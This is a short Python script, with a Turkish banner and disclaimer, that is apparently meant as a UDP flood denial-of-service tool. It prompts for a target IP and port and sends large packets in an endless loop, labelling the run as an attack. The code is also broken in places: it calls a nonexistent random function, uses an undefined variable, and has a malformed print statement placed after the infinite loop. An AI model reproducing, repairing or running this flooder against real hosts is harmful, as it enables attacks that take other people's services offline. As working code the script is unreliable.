import socket
import random
import os

os.system("clear")

banner="""
     ________        ___________     ____________        _
     |       |      |           |    |          |  |    _ 
     |        |     |           |    |          |  |   _
     |         |    |           |    |          |  |  _
     |          |   |___________|    |   _______|  |__      
     |           |  |           |    | |           |   _
     |           |  |           |    |   |         |     _
     |          |   |           |    |    |        |      -
     |_________|    |           |    |     |       |       -

        ________          ______________
        |       |         |             |  _______________
        |        |        |             |  |
        |         |       | ___________ |  |
        |          |      | |         | |  |
        |           |     | |         | |  |_____________             
        |           |     | |_________| |               |
        |          |      |             |               |
        |_________|       |_____________|   ____________|

"""
print(banner)

print("""
          ___________________________________________________________________________________
         |                                                                                   |
         |  BU TOOL DARKANEPOR TARAFINDAN KODLANMIŞTIR OLUŞACAK TÜMM HUKUKİ SONUÇLAR KULANAN |
         |                           KİŞİYE  AİTTİR.                                         |
         |___________________________________________________________________________________|                          
                          """)

hedef_ip=input("HEDEF İP ADRES =>")
hedef_port=input("PORT =>")

bytes=random._unrandom(9000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
    sock.sendto(bytes,(hedef_ip_port))
    sayac=sayac+1
print("SALDIRI BASLATILID,GONDERILEN PAKET:%s"%"(sayac))


